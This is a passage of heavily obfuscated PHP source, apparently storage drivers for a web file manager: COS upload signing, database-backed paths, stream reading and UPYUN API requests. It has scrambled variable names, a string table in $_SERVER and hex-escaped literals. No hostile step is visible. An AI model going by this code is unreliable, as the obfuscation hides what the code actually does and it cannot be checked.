$ÏÊ×‰µ’[1200]; } if ($ÂÖ»¼¸‰[$ÏÊ×‰µ’[33]] == $ÏÊ×‰µ’[106] && $ó­èå€é[$ÏÊ×‰µ’[33]] == $ÏÊ×‰µ’[866]) { return $ÏÊ×‰µ’[107]; } return $ÏÊ×‰µ’[1319]; } public static function driverType($Í®÷¬†£) { $ÁÇş®å =& $_SERVER[Ì¥ŞÒ°£]; $Ï‚¾ûŒˆ = str_replace($ÁÇş®å[1320], $ÁÇş®å[12], strtolower($Í®÷¬†£->getType())); if ($Ï‚¾ûŒˆ == $ÁÇş®å[760] || $Ï‚¾ûŒˆ == $ÁÇş®å[1321] || $Ï‚¾ûŒˆ == $ÁÇş®å[1322]) { $Í®÷¬†£ = self::defaultDriverInit(); } else { if ($Ï‚¾ûŒˆ == $ÁÇş®å[1210] || $Ï‚¾ûŒˆ == $ÁÇş®å[1323]) { $Í®÷¬†£ = IO::init($Í®÷¬†£->pathParse[$ÁÇş®å[1156]]); } } $“æå›© = $Í®÷¬†£->path; $Ï‚¾ûŒˆ = str_replace($ÁÇş®å[1320], $ÁÇş®å[12], strtolower($Í®÷¬†£->getType())); if ($Ï‚¾ûŒˆ == $ÁÇş®å[106]) { return array($ÁÇş®å[33] => $ÁÇş®å[106], $ÁÇş®å[1317] => $ÁÇş®å[12], $ÁÇş®å[84] => $“æå›©); } return array($ÁÇş®å[33] => $ÁÇş®å[866], $ÁÇş®å[1317] => $Í®÷¬†£->pathDriver, $ÁÇş®å[84] => $“æå›©); } public static function pathDriverType($â¸ğ©Ù÷) { return $â¸ğ©Ù÷ ? self::driverType(IO::init($â¸ğ©Ù÷)) : !1; } } class PathDriverCOS extends PathDriverBaseS3 { public function __construct($ôÍØšÖü) { parent::__construct($ôÍØšÖü); $this->signatureVersion($_SERVER[Ì¥ŞÒ°£][216]); } public function uploadFormData($“ıÍĞ‡, $ÎµáğÕõ = 3600) { $ˆ»°—Ğ =& $_SERVER[Ì¥ŞÒ°£]; $´Ê”¥†Ì = $ˆ»°—Ğ[198]; $‰©ÆË¾ü = $ˆ»°—Ğ[232]; $ùÚàê“¯ = $ˆ»°—Ğ[1324]; $²°Ş³€ = gmdate($ˆ»°—Ğ[1325], time() + $ÎµáğÕõ); $à·–Ëö¨ = (string) time() . $ˆ»°—Ğ[71] . (string) (time() + $ÎµáğÕõ); $×“ÈÜ›Ú = array($ˆ»°—Ğ[1326] => $²°Ş³€, $ˆ»°—Ğ[1327] => array(array($ˆ»°—Ğ[1328] => $´Ê”¥†Ì), array($ˆ»°—Ğ[1329] => $this->bucket), array($ˆ»°—Ğ[1330], $ˆ»°—Ğ[1331], $ˆ»°—Ğ[12]), array($ˆ»°—Ğ[1332] => $ùÚàê“¯), array($ˆ»°—Ğ[1333] => $‰©ÆË¾ü), array($ˆ»°—Ğ[1334] => $this->accessKey), array($ˆ»°—Ğ[1335] => $à·–Ëö¨))); $×“ÈÜ›Ú = json_encode($×“ÈÜ›Ú); $¾¬¨ûé˜ = hash_hmac($ˆ»°—Ğ[232], $à·–Ëö¨, $this->secret); $€×ø¯±Ã = sha1($×“ÈÜ›Ú); $µ½Öôï¸ = hash_hmac($ˆ»°—Ğ[232], $€×ø¯±Ã, $¾¬¨ûé˜); $İ›–û„  = array($ˆ»°—Ğ[1328] => $´Ê”¥†Ì, $ˆ»°—Ğ[1332] => $ùÚàê“¯, $ˆ»°—Ğ[1336] => base64_encode($×“ÈÜ›Ú), $ˆ»°—Ğ[1333] => $‰©ÆË¾ü, $ˆ»°—Ğ[1334] => $this->accessKey, $ˆ»°—Ğ[1337] => $à·–Ëö¨, $ˆ»°—Ğ[1338] => $µ½Öôï¸, $ˆ»°—Ğ[181] => $this->getHost()); return $İ›–û„ ; } public function fileOutLink($ŸØó´ùí) { $ªÕ¨¨ =& $_SERVER[Ì¥ŞÒ°£]; if (substr($ŸØó´ùí, 0, 7) == $ªÕ¨¨[1339]) { $ŸØó´ùí = $ªÕ¨¨[1340] . substr($ŸØó´ùí, 7); } header($ªÕ¨¨[161] . $ŸØó´ùí); die; } } class PathDriverDB extends PathDriverBase { public $model; public $pathParse; public function __construct($£ï¢Ò©à) { $this->pathParse = $£ï¢Ò©à; $this->model = Model($_SERVER[Ì¥ŞÒ°£][1341]); } public function getPath($è­É°¸) { return trim($è­É°¸, $_SERVER[Ì¥ŞÒ°£][8]); } public function pathFather($øúÜ½­) { $Ù¬Ïşî¹ = $this->parse($øúÜ½­); $Ù¬Ïşî¹ = $this->infoSimple($øúÜ½­); return $Ù¬Ïşî¹ ? $Ù¬Ïşî¹[$_SERVER[Ì¥ŞÒ°£][432]] : !1; } public function pathThis($Æ•Ïäş“) { $€¹Ş˜›Ø = $this->infoSimple($Æ•Ïäş“); return $€¹Ş˜›Ø ? $€¹Ş˜›Ø[$_SERVER[Ì¥ŞÒ°£][32]] : !1; } public function getPathOuter($Ş¦²”®¬) { if (!$Ş¦²”®¬) { return $Ş¦²”®¬; } $‘øÑÎ¢ = $this->parse($Ş¦²”®¬); return KodIO::make($‘øÑÎ¢[$_SERVER[Ì¥ŞÒ°£][399]]); } public function copyFolderFromIO($©Æü»¼™, $Ùºå¡ÚŸ, $¶Ğ¾•¾Á, $Öİò, $ƒéÕ‰×) { $û¨§Ë‰ = $this->model->copyFolderFromIO($©Æü»¼™, $Ùºå¡ÚŸ, $¶Ğ¾•¾Á, $Öİò, $ƒéÕ‰×); return KodIO::make($û¨§Ë‰); } public function isParentOf($®Ï©ŞŠ½, $¥Çå™øè) { return $this->model->isParentOf($®Ï©ŞŠ½, $¥Çå™øè); } public function mkfile($õóş‚ö“, $¼´Øí¬ = '', $çÜ¹Â“º = REPEAT_RENAME) { $Ó ìšà =& $_SERVER[Ì¥ŞÒ°£]; $—®›ô¼œ = $this->parse($õóş‚ö“); $õóş‚ö“ = $—®›ô¼œ[$Ó ìšà[399]]; for ($šÃ’Êãº = 0; $šÃ’Êãº < count($—®›ô¼œ[$Ó ìšà[1342]]); $šÃ’Êãº++) { $¼Š°Ù– = $—®›ô¼œ[$Ó ìšà[1342]][$šÃ’Êãº]; if ($šÃ’Êãº == count($—®›ô¼œ[$Ó ìšà[1342]]) - 1) { $õóş‚ö“ = $this->model->mkfile($õóş‚ö“, $¼Š°Ù–, $¼´Øí¬, $çÜ¹Â“º); break; } $õóş‚ö“ = $this->model->mkdir($õóş‚ö“, $¼Š°Ù–, REPEAT_SKIP); } return $this->getPathOuter($õóş‚ö“); } public function mkdir($…¢Â•Ôé, $à†äÂ× = REPEAT_SKIP) { $”ıëÕÖÈ =& $_SERVER[Ì¥ŞÒ°£]; $Ö›ÅÑ¡Ÿ = $this->parse($…¢Â•Ôé); $…¢Â•Ôé = $Ö›ÅÑ¡Ÿ[$”ıëÕÖÈ[399]]; for ($£¡òÜ¦ = 0; $£¡òÜ¦ < count($Ö›ÅÑ¡Ÿ[$”ıëÕÖÈ[1342]]); $£¡òÜ¦++) { $ÔßèÑì” = $Ö›ÅÑ¡Ÿ[$”ıëÕÖÈ[1342]][$£¡òÜ¦]; $…¢Â•Ôé = $this->model->mkdir($…¢Â•Ôé, $ÔßèÑì”, $à†äÂ×); } return $this->getPathOuter($…¢Â•Ôé); } public function copyFile($©ÎÇ¢ÑÎ, $Å«›ú„Ò, $ãù²èÎ“ = REPEAT_REPLACE) { $çí§ÄÁ =& $_SERVER[Ì¥ŞÒ°£]; $Ø¡áÆğ© = $this->parse($Å«›ú„Ò); $“©ëŞµÖ = $this->model->copy($©ÎÇ¢ÑÎ, $Ø¡áÆğ©[$çí§ÄÁ[399]], $ãù²èÎ“, $Ø¡áÆğ©[$çí§ÄÁ[84]]); return $“©ëŞµÖ ? $this->getPathOuter($“©ëŞµÖ) : !1; } public function moveFile($ì»Ã»üÔ, $£“ñıòÉ, $¹åí  = REPEAT_REPLACE) { $ÉÓêêÒë =& $_SERVER[Ì¥ŞÒ°£]; $ÃÈœôÁà = $this->parse($£“ñıòÉ); $‚è¯’ = $this->model->move($ì»Ã»üÔ, $ÃÈœôÁà[$ÉÓêêÒë[399]], $¹åí , $ÃÈœôÁà[$ÉÓêêÒë[84]]); return $‚è¯’ ? $this->getPathOuter($‚è¯’) : !1; } public function copy($ÚÛ£çç˜, $¨ğ‡éÅÙ, $ğŸ™ê–¥ = REPEAT_REPLACE, $İ÷³Ûå† = false) { $»ôËü™º = $this->parse($¨ğ‡éÅÙ); $ö§ÙÈ”ı = $this->model->copy($ÚÛ£çç˜, $»ôËü™º[$_SERVER[Ì¥ŞÒ°£][399]], $ğŸ™ê–¥, $İ÷³Ûå†); return $ö§ÙÈ”ı ? $this->getPathOuter($ö§ÙÈ”ı) : !1; } public function moveSameAllow() { } public function move($¡’ÏŠÎ, $ê±ıºõš, $÷çø†óÁ = REPEAT_REPLACE, $–áãšİ = false) { $Ï¹šÕ¹™ = $this->parse($ê±ıºõš); $î•úÄéŸ = $this->model->move($¡’ÏŠÎ, $Ï¹šÕ¹™[$_SERVER[Ì¥ŞÒ°£][399]], $÷çø†óÁ, $–áãšİ); return $î•úÄéŸ ? $this->getPathOuter($î•úÄéŸ) : !1; } public function remove($›«È¤é¿, $©À­äÇ = true) { return $this->model->remove($›«È¤é¿, $©À­äÇ); } public function rename($ß€Ã‘ğĞ, $ë¼¤Ö•Ô) { $ÍÍ¦…Í³ = $this->model->rename($ß€Ã‘ğĞ, $ë¼¤Ö•Ô); return $ÍÍ¦…Í³ ? $this->getPathOuter($ß€Ã‘ğĞ) : $ÍÍ¦…Í³; } public function size($Ï¶ÑÂ—°) { $ê¸Œ…÷ = $this->infoSimple($Ï¶ÑÂ—°); return $ê¸Œ…÷ ? $ê¸Œ…÷[$_SERVER[Ì¥ŞÒ°£][76]] : 0; } public function infoSimple($ç¡Ì”çí) { return $this->model->sourceInfo($ç¡Ì”çí); } public function info($û•·­Õ) { return $this->infoParse($û•·­Õ); } public function infoAuth($¹ó€…úş) { return $this->infoParse($¹ó€…úş, !1, !0); } public function infoWithChildren($ç«šëÇ’) { return $this->infoParse($ç«šëÇ’, !0); } protected function infoParse($ÙÈî—¦, $Æ¤½Ş¾’ = false, $Ğ¬¶Æ¬ = false) { if (!$Æ¤½Ş¾’) { return $this->model->pathInfo($ÙÈî—¦, $Ğ¬¶Æ¬); } return $this->model->pathInfoMore($ÙÈî—¦); } public function infoFull($Ô´íŞìÕ) { $İ¶èÊùŞ =& $_SERVER[Ì¥ŞÒ°£]; $´¨Æ£‘Ó = explode($İ¶èÊùŞ[8], $Ô´íŞìÕ); $¥Ñ¬Ã‡‚ = implode($İ¶èÊùŞ[8], array_splice($´¨Æ£‘Ó, 1)); return $this->model->pathInfoByPath($´¨Æ£‘Ó[0], $¥Ñ¬Ã‡‚); } public function hashSimple($ßÔ¶È‹) { $åÚÌëòÓ =& $_SERVER[Ì¥ŞÒ°£]; $ÈÑ«¿…© = $this->infoWithChildren($ßÔ¶È‹); return $ÈÑ«¿…©[$åÚÌëòÓ[170]][$åÚÌëòÓ[177]]; } public function hashMd5($ÔîÅÚ‘Å) { $Á©¬ Š‚ =& $_SERVER[Ì¥ŞÒ°£]; $Ê‹ÙßıÇ = $this->infoWithChildren($ÔîÅÚ‘Å); return $Ê‹ÙßıÇ[$Á©¬ Š‚[170]][$Á©¬ Š‚[176]]; } public function exist($Óª…Ì–¼) { $òÑ¿’³ë =& $_SERVER[Ì¥ŞÒ°£]; $´íöºß = $this->parse($Óª…Ì–¼); if (!$´íöºß[$òÑ¿’³ë[84]]) { return $this->isFile($Óª…Ì–¼) || $this->isFolder($Óª…Ì–¼); } $Ì¬Æ’Õò = array($òÑ¿’³ë[401] => $´íöºß[$òÑ¿’³ë[399]], $òÑ¿’³ë[32] => $´íöºß[$òÑ¿’³ë[84]]); $õ£ëÂ©£ = $this->model->where($Ì¬Æ’Õò)->find(); return $õ£ëÂ©£ ? !0 : !1; } public function isFile($æùÆÛˆì) { $òºôØ˜à =& $_SERVER[Ì¥ŞÒ°£]; $ø‘˜•×– = $this->infoSimple($æùÆÛˆì); return $ø‘˜•×– && $ø‘˜•×–[$òºôØ˜à[410]] == $òºôØ˜à[88] ? !1 : !0; } public function isFolder($îª°õâë) { $ŞƒÖ©©£ =& $_SERVER[Ì¥ŞÒ°£]; $îïŞ«ü = $this->infoSimple($îª°õâë); return $îïŞ«ü && $îïŞ«ü[$ŞƒÖ©©£[410]] == $ŞƒÖ©©£[88] ? !0 : !1; } public function listPath($àÀ‡‘óÂ, $éøÒîÅü = false) { $Óõ«ğ‘® =& $_SERVER[Ì¥ŞÒ°£]; if ($àÀ‡‘óÂ == $Óõ«ğ‘®[12]) { return !1; } $ØØ­Øä¹ = array($Óõ«ğ‘®[401] => $àÀ‡‘óÂ); if ($éøÒîÅü) { return $this->model->listSource($ØØ­Øä¹, -1); } return $this->model->listSource($ØØ­Øä¹); } public function has($¤¸‚ß¢Ü, $Ü×À‹ÓÎ = false, $É­í»£ = null) { $¸Ã—Ã—Â =& $_SERVER[Ì¥ŞÒ°£]; $½ñÖíª = $this->infoWithChildren($¤¸‚ß¢Ü); if ($Ü×À‹ÓÎ) { return array($¸Ã—Ã—Â[208] => $½ñÖíª[$¸Ã—Ã—Â[208]], $¸Ã—Ã—Â[207] => $½ñÖíª[$¸Ã—Ã—Â[207]]); } return $É­í»£ ? $½ñÖíª[$¸Ã—Ã—Â[208]] : $½ñÖíª[$¸Ã—Ã—Â[207]]; } public function listAll($¬Ïâç¥) { $†¥¿ŞĞÁ = IO::info($this->pathParse[$_SERVER[Ì¥ŞÒ°£][84]]); if (!$†¥¿ŞĞÁ) { return array(); } return $this->model->listAll($¬Ïâç¥); } public function getContent($œ»¹¸Õ”) { return $this->model->getContent($œ»¹¸Õ”); } public function setContent($Ä»Å£òÈ, $ú—¶³‡ = '') { return $this->model->setContent($Ä»Å£òÈ, $ú—¶³‡); } public function fileSubstr($ÌŸ¨¾é›, $«Ÿä—, $¦ÚÎé‚¯) { return $this->model->fileSubstr($ÌŸ¨¾é›, $«Ÿä—, $¦ÚÎé‚¯); } public function download($¹Ó‰‡¡, $€”ä´Œ = '') { $ÙÀ ‘¼” = get_path_father($€”ä´Œ); $áÍæé™» = get_path_this($€”ä´Œ); $Èáó¿õ = $this->model->fileInfoGet($¹Ó‰‡¡); $ı¯ëõşè = IO::copy($Èáó¿õ[$_SERVER[Ì¥ŞÒ°£][84]], $ÙÀ ‘¼”, !1, $áÍæé™»); return $ı¯ëõşè; } public function setModifyTime($úòèáßç, $‚÷ĞËëï = '') { $Ïº‰«àâ =& $_SERVER[Ì¥ŞÒ°£]; if (!$úòèáßç) { return; } $this->model->where(array($Ïº‰«àâ[417] => $úòèáßç))->save(array($Ïº‰«àâ[85] => $‚÷ĞËëï)); } public function upload($» ®±´–, $‚ğ²úÄ˜, $ş“¯äÜ» = false, $İ‰æ·¾È = REPEAT_REPLACE) { $™¹Œç× =& $_SERVER[Ì¥ŞÒ°£]; $Æ´Úª¯ = $this->parse($» ®±´–); $ˆë¨…¼ = $this->model->addFile($Æ´Úª¯[$™¹Œç×[399]], $‚ğ²úÄ˜, $Æ´Úª¯[$™¹Œç×[84]], $ş“¯äÜ», $İ‰æ·¾È); return $this->getPathOuter($ˆë¨…¼); } public function uploadFileByID($É¦­Úğ, $®§¨¥ŒŠ, $Ş„šÑ¬ä) { $ŞËõ‹Ñ =& $_SERVER[Ì¥ŞÒ°£]; $çß¥ìïó = $this->parse($É¦­Úğ); $¯ûß¢ô¼ = $this->model->addFileByFileID($çß¥ìïó[$ŞËõ‹Ñ[399]], $®§¨¥ŒŠ, $çß¥ìïó[$ŞËõ‹Ñ[84]], $Ş„šÑ¬ä); return $this->getPathOuter($¯ûß¢ô¼); } public function addFileByRemote($çÇ¹ğÀ¤, $«ÍÀ“Ø, $Ï½¦µŒÅ = array(), $²òã‡› = '', $¼¡¶±½ö) { $Ì…Æ…ÊĞ =& $_SERVER[Ì¥ŞÒ°£]; $µ½Î¦— = $this->parse($çÇ¹ğÀ¤); $²òã‡› = empty($²òã‡›) ? $µ½Î¦—[$Ì…Æ…ÊĞ[84]] : $²òã‡›; $˜ğˆİ™™ = $this->model->addFileByRemote($µ½Î¦—[$Ì…Æ…ÊĞ[399]], $«ÍÀ“Ø, $²òã‡›, $Ï½¦µŒÅ, $¼¡¶±½ö); return $this->getPathOuter($˜ğˆİ™™); } public function uploadLink($ğ†á®¼Æ, $€ğğŒÂİ = 0) { $Èä‚ÉùÆ =& $_SERVER[Ì¥ŞÒ°£]; $­šèõ¹Ö = $this->parse($ğ†á®¼Æ); $”Äé±ùá = _get($GLOBALS[$Èä‚ÉùÆ[7]], $Èä‚ÉùÆ[1343]); $áÁÑÅ = _get($GLOBALS[$Èä‚ÉùÆ[7]], $Èä‚ÉùÆ[1344]); $ğ†á®¼Æ = Model($Èä‚ÉùÆ[609])->createFileName($­šèõ¹Ö[$Èä‚ÉùÆ[84]], $”Äé±ùá, $áÁÑÅ); return IO::uploadLink($ğ†á®¼Æ, $€ğğŒÂİ); } public function fileNameAuto($”õÅòŸ, $îôò·´Ô, $Ìä•äè¼ = REPEAT_REPLACE, $ó»­¯¦¥ = false) { return $this->model->fileNameAuto($”õÅòŸ, $îôò·´Ô, $Ìä•äè¼, $ó»­¯¦¥); } public function fileNameExist($ÎŞ¡× ­, $ü«¦½°ù) { return $this->model->fileNameExist($ÎŞ¡× ­, $ü«¦½°ù); } protected function _fileOut($ª˜§±æÇ, $—±ùêã„ = false, $èÆ§…‚ = false, $ïªê¡×® = '', $òŞ“ÀÁ  = false) { $°âı¦öŒ =& $_SERVER[Ì¥ŞÒ°£]; $†ó¦ŠåÏ = $this->model->sourceInfo($ª˜§±æÇ); if ($†ó¦ŠåÏ[$°âı¦öŒ[410]] == $°âı¦öŒ[88]) { header($°âı¦öŒ[1345]); die; } $…‚É¨øç = $this->model->fileInfoGet($ª˜§±æÇ); $ïªê¡×® = $…‚É¨øç[$°âı¦öŒ[176]] ? $…‚É¨øç[$°âı¦öŒ[176]] : $ïªê¡×®; $·³âÒ‰ = isset($GLOBALS[$°âı¦öŒ[1346]]) ? $GLOBALS[$°âı¦öŒ[1346]] : $†ó¦ŠåÏ[$°âı¦öŒ[32]]; if ($òŞ“ÀÁ ) { return IO::fileOutServer($…‚É¨øç[$°âı¦öŒ[84]], $—±ùêã„, $·³âÒ‰, $ïªê¡×®); } IO::fileOut($…‚É¨øç[$°âı¦öŒ[84]], $—±ùêã„, $·³âÒ‰, $ïªê¡×®); } public function fileOut($úèü‹¸Ï, $Åïª¸šš = false, $¦íÃÆƒï = false, $¬ÍÏ®È = '') { $this->_fileOut($úèü‹¸Ï, $Åïª¸šš, $¦íÃÆƒï, $¬ÍÏ®È); } public function fileOutServer($›¿¿ÃÍ, $ôÁ¨îš¬ = false, $ê†Ÿüîê = false, $–Ãüª¤¼ = '') { $this->_fileOut($›¿¿ÃÍ, $ôÁ¨îš¬, $ê†Ÿüîê, $–Ãüª¤¼, !0); } protected function _fileOutImage($Ğ§®±æ†, $üšÄ ûÉ = 250) { $‡ñİÄ¶ =& $_SERVER[Ì¥ŞÒ°£]; $ªµĞÎİ = $this->model->pathInfo($Ğ§®±æ†); if ($ªµĞÎİ[$‡ñİÄ¶[410]] == $‡ñİÄ¶[88]) { show_json($‡ñİÄ¶[1347] . $Ğ§®±æ†, !1); } $¿â¸ì½ = $this->model->fileInfoGet($Ğ§®±æ†); $¿â¸ì½[$‡ñİÄ¶[32]] = $ªµĞÎİ[$‡ñİÄ¶[32]]; $¿â¸ì½[$‡ñİÄ¶[169]] = $ªµĞÎİ[$‡ñİÄ¶[169]]; $GLOBALS[$‡ñİÄ¶[1346]] = $¿â¸ì½[$‡ñİÄ¶[32]]; $GLOBALS[$‡ñİÄ¶[168]] = $¿â¸ì½; IO::fileOutImage($¿â¸ì½[$‡ñİÄ¶[84]], $üšÄ ûÉ); } public function fileOutImage($áß¬å€­, $ïú‹ÓÎ¾ = 250) { $this->_fileOutImage($áß¬å€­, $ïú‹ÓÎ¾); } public function fileOutImageServer($îğßğ¥, $Ş§Ìî«Ú = 250) { $this->_fileOutImage($îğßğ¥, $Ş§Ìî«Ú); } public function link($ÚÖ¦ùå°, $ÊÑÒ²‹ = '') { $ßóù«‡Æ = $this->model->fileInfoGet($ÚÖ¦ùå°); return IO::link($ßóù«‡Æ[$_SERVER[Ì¥ŞÒ°£][84]], $ÊÑÒ²‹); } protected function parse($Ø³âàÄ¤) { $¥¦µÁ =& $_SERVER[Ì¥ŞÒ°£]; if (strstr($Ø³âàÄ¤, $¥¦µÁ[8]) === !1) { return array($¥¦µÁ[419] => intval($Ø³âàÄ¤), $¥¦µÁ[84] => $¥¦µÁ[12], $¥¦µÁ[1342] => array()); } $ÇïÛÓ‹ = explode($¥¦µÁ[8], trim($Ø³âàÄ¤, $¥¦µÁ[8])); if (count($ÇïÛÓ‹) < 2) { show_tips(clear_html($Ø³âàÄ¤) . $¥¦µÁ[1348]); } return array($¥¦µÁ[419] => intval($ÇïÛÓ‹[0]), $¥¦µÁ[84] => $ÇïÛÓ‹[1], $¥¦µÁ[1342] => array_slice($ÇïÛÓ‹, 1)); } } goto A¿ÑÚ¢Ší; D¼«ææÇ¬Ü: class PathDriverStream extends PathDriverBase { const TYPE_STRING = 1; const TYPE_FILE = 2; public function __construct($ùÚ£¤æ„, $İ¡¹–¢Â = 0) { parent::__construct(); $this->source = $ùÚ£¤æ„; $this->sourceSize = $İ¡¹–¢Â; if (is_string($this->source)) { $this->sourceType = self::TYPE_STRING; $this->sourceSize = strlen($this->source); } else { $this->sourceType = self::TYPE_FILE; } } public function size($”Ğ¥¡ù = false) { return $this->sourceSize; } public function getContent($©œúÑÊ¤ = false) { return $this->fileSubstr($©œúÑÊ¤, 0, $this->sourceSize); } public function fileSubstr($£Ø€Éš× = false, $Ô®Š¶‡Ÿ = 0, $è‚€ÄÙÃ = 0) { if (!$è‚€ÄÙÃ) { $è‚€ÄÙÃ = $this->sourceSize; } $½ò‡³â = $this->sourceSize - $Ô®Š¶‡Ÿ; if ($è‚€ÄÙÃ >= $½ò‡³â) { $è‚€ÄÙÃ = $½ò‡³â; } if ($this->sourceType == self::TYPE_STRING) { return substr($this->source, $Ô®Š¶‡Ÿ, $è‚€ÄÙÃ); } if ($this->sourceType == self::TYPE_FILE) { if ($è‚€ÄÙÃ <= 0) { return $_SERVER[Ì¥ŞÒ°£][12]; } $úáÏ¡Ò½ = ftell($this->source); fseek_64($this->source, $úáÏ¡Ò½ + $Ô®Š¶‡Ÿ); $™Ê¨ü = @fread($this->source, $è‚€ÄÙÃ); fseek_64($this->source, $úáÏ¡Ò½); return $™Ê¨ü; } } public function hashMd5($ˆ›ÒÚçà = false) { return md5($this->getContent()); } public static function hash($®ºïÔ®è, $â§óÈğ˜ = 0) { $·ÜŠÁ¨ü = new PathDriverStream($®ºïÔ®è, $â§óÈğ˜); return $·ÜŠÁ¨ü->hashSimple($®ºïÔ®è); } public static function md5($ñ…ã¨ö‘, $¯Ş¸Šıà = 0) { $ËÃ‚Õ—Ü = new PathDriverStream($ñ…ã¨ö‘, $¯Ş¸Šıà); return $ËÃ‚Õ—Ü->hashMd5($ñ…ã¨ö‘); } } class PathDriverUSS extends PathDriverBase { protected $bucket = ''; protected $username = ''; protected $userpass = ''; protected $domain = ''; protected $token = ''; protected $endpoint = "\x68\164\164\x70\x3a\57\x2f\x76\60\x2e\x61\160\x69\x2e\165\x70\x79\165\x6e\x2e\143\157\155"; public $ioUploadServer = 0; public $ioFileOutServer = 0; public function __construct($“Üàì¬Û) { parent::__construct(); $this->_init($“Üàì¬Û); } public function _init($®†îİí´) { $ğ”¹Âş =& $_SERVER[Ì¥ŞÒ°£]; foreach ($®†îİí´ as $µº€ƒ§— => $šÃÛûÒ’) { if (isset($this->{$µº€ƒ§—})) { $this->{$µº€ƒ§—} = $šÃÛûÒ’; } } if (empty($this->username) || empty($this->userpass) || empty($this->domain)) { throw new Exception($ğ”¹Âş[1467] . LNG($ğ”¹Âş[1398])); } } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } private function ussHeaders($è‚×À§, $‡æ‹·ì» = "\107\105\124") { $¦ëÅØŞÚ =& $_SERVER[Ì¥ŞÒ°£]; $ÖÏ²ÛÙ§ = gmdate($¦ëÅØŞÚ[1431]); $íš—Ñ¶‚ = base64_encode(hash_hmac($¦ëÅØŞÚ[1468], "{$‡æ‹·ì»}\46{$è‚×À§}\46{$ÖÏ²ÛÙ§}", md5("{$this->userpass}"), !0)); $ÈñÂæÑÅ = array("\x41\x75\164\150\x6f\162\x69\x7a\141\x74\x69\x6f\156\x3a\125\x50\131\125\x4e\40{$this->username}\x3a{$íš—Ñ¶‚}", "\104\141\x74\x65\72{$ÖÏ²ÛÙ§}"); return $ÈñÂæÑÅ; } public function ussRequest($ï·‡é¾›, $ı¹«©ö° = "\107\x45\124", $´øãº  = false, $ˆ—ñ…É† = false, $ãàèõ°© = false) { $ÈïÈ– =& $_SERVER[Ì¥ŞÒ°£]; $ï·‡é¾› = trim($ï·‡é¾›, $ÈïÈ–[8]); $ùÍõÃíÏ = "\57{$this->bucket}\x2f{$ï·‡é¾›}"; $Ç´›‘ ë = $this->ussHeaders($ùÍõÃíÏ, $ı¹«©ö°); if ($ˆ—ñ…É†) { $Ç´›‘ ë = array_merge($Ç´›‘ ë, $ˆ—ñ…É†); } $®¸Èƒ¡ = url_request($this->endpoint . $ùÍõÃíÏ, $ı¹«©ö°, $´øãº , $Ç´›‘ ë, $ãàèõ°©); if (!$®¸Èƒ¡) { return array($ÈïÈ–[1218] => !1, $ÈïÈ–[1208] => $ÈïÈ–[1469]); } if (strtolower($ı¹«©ö°) == $ÈïÈ–[196] || in_array($®¸Èƒ¡[$ÈïÈ–[1218]], array($ÈïÈ–[1324], $ÈïÈ–[1470]))) { $´øãº  = $®¸Èƒ¡[$ÈïÈ–[1471]]; } else { $´øãº  = json_decode($®¸Èƒ¡[$ÈïÈ–[1208]], !0); if (!$´øãº ) { $´øãº  = $®¸Èƒ¡[$ÈïÈ–[1208]]; } else { if (!$®¸Èƒ¡[$ÈïÈ–[752]] && isset($´øãº [$ÈïÈ–[1472]])) { $´øãº  = $´øãº [$ÈïÈ–[1472]]; } } } return array($ÈïÈ–[1218] => $®¸Èƒ¡[$ÈïÈ–[752]], $ÈïÈ–[1208] => $´øãº ); } public function mkfile($Ï»¿¡Òü, $®÷‡¨öô = '', $ö¦ Ô· = REPEAT_RENAME) { if ($this->setContent($Ï»¿¡Òü, $®÷‡¨öô)) { return $this->getPathOuter($Ï»¿¡Òü); } return !1; } public function mkdir($à£Š§—î, $»÷Á€¯¶ = REPEAT_SKIP) { $ŸÈõìˆ” =& $_SERVER[Ì¥ŞÒ°£]; $’Å§áä§ = trim($à£Š§—î, $ŸÈõìˆ”[8]); if ($this->_isFolder($’Å§áä§)) { return $this->getPathOuter($’Å§áä§); } $­‹¿«¬¤ = array($ŸÈõìˆ”[1473]); $ÇÚÖ‰À = $this->ussRequest($’Å§áä§, $ŸÈõìˆ”[226], !1, $­‹¿«¬¤); return $ÇÚÖ‰À[$ŸÈõìˆ”[1218]] ? $this->getPathOuter($’Å§áä§) : !1; } public function copyFile($ÈÇ²¹µÁ, $£à®ˆ¹õ) { $¶·†è­í =& $_SERVER[Ì¥ŞÒ°£]; $Š‹›å•— = array($¶·†è­í[1474] . "\57{$this->bucket}\57{$ÈÇ²¹µÁ}", $¶·†è­í[1475]); $Û·Ô¿ıš = $this->ussRequest($£à®ˆ¹õ, $¶·†è­í[228], !1, $Š‹›å•—); return $Û·Ô¿ıš[$¶·†è­í[1218]] ? !0 : $this->getPathOuter($£à®ˆ¹õ); } public function moveFile($Îõä¡ÍÆ, $å†¡äø) { $ãÈ´â°± =& $_SERVER[Ì¥ŞÒ°£]; $—¦³³•ò = array($ãÈ´â°±[1476] . "\57{$this->bucket}\x2f{$Îõä¡ÍÆ}", $ãÈ´â°±[1475]); $±ÚÒ¼±â = $this->ussRequest($å†¡äø, $ãÈ´â°±[228], !1, $—¦³³•ò); return $±ÚÒ¼±â[$ãÈ´â°±[1218]] ? !0 : $this->getPathOuter($å†¡äø); } public function delFile($·ïÍó¢Í) { $Ëìã× =& $_SERVER[Ì¥ŞÒ°£]; $Ò—ÒÏ·Š = $this->ussRequest($·ïÍó¢Í, $Ëìã×[1477]); return $Ò—ÒÏ·Š[$Ëìã×[1218]] ? !0 : !1; } public function delFolder($Å–ÍŠª) { $Ÿ©÷‰Úê =& $_SERVER[Ì¥ŞÒ°£]; if (!$this->exist($Å–ÍŠª)) { return !0; } $this->listItemCache = !1; $„Î™¼‹ğ = $à«‹Ù÷ = array(); $this->fileList($Å–ÍŠª, $„Î™¼‹ğ, $à«‹Ù÷, !0); $this->listItemCache = !0; foreach ($à«‹Ù÷ as $–Ìı±çÚ) { $ê³ ¼œÓ = $this->ussRequest($–Ìı±çÚ[$Ÿ©÷‰Úê[32]], $Ÿ©÷‰Úê[1477]); if (!$ê³ ¼œÓ[$Ÿ©÷‰Úê[1218]]) { return !1; } } foreach ($„Î™¼‹ğ as $ËæúŒ¨º) { $ê³ ¼œÓ = $this->ussRequest($ËæúŒ¨º, $Ÿ©÷‰Úê[1477]); if (!$ê³ ¼œÓ[$Ÿ©÷‰Úê[1218]]) { return !1; } } $ê³ ¼œÓ = $this->ussRequest($Å–ÍŠª, $Ÿ©÷‰Úê[1477]); return $ê³ ¼œÓ[$Ÿ©÷‰Úê[1218]]; } public function rename($Õ×³Œ®¹, $ÇÏ¢˜±Ú) { if ($this->isFile($Õ×³Œ®¹)) { $ÇÏ¢˜±Ú = 